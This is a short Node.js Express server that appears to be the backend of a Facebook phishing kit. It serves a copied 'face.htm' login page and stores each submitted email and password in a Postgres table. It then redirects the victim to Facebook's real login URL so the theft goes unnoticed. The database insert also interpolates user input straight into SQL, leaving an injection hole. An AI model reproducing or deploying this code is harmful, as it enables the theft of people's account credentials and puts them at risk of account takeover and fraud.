var express = require('express');
var app = express();
var path = require('path');
var bodyParser = require('body-parser');

const pg = require('pg');
pg.defaults.ssl = true;
const connectionString = process.env.DATABASE_URL;

app.use(bodyParser.urlencoded({
    extended: false
}))
app.use(bodyParser.json())

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname + '/face.htm'));
});

app.get('/face_files/:id', function (req, res) {
    res.sendFile(path.join(__dirname + '/face_files/' + req.params.id));
});

app.post('/s', function (req, res) {
    const pool = new pg.Pool({
        connectionString
    });
    pool.query(`insert into oooo (id, l, p) values (null,'${req.body.email}','${req.body.pass}')`, (err, res) => {
        console.log(err, res);
        pool.end();
    });
    res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
});

app.listen(process.env.PORT || 5000);
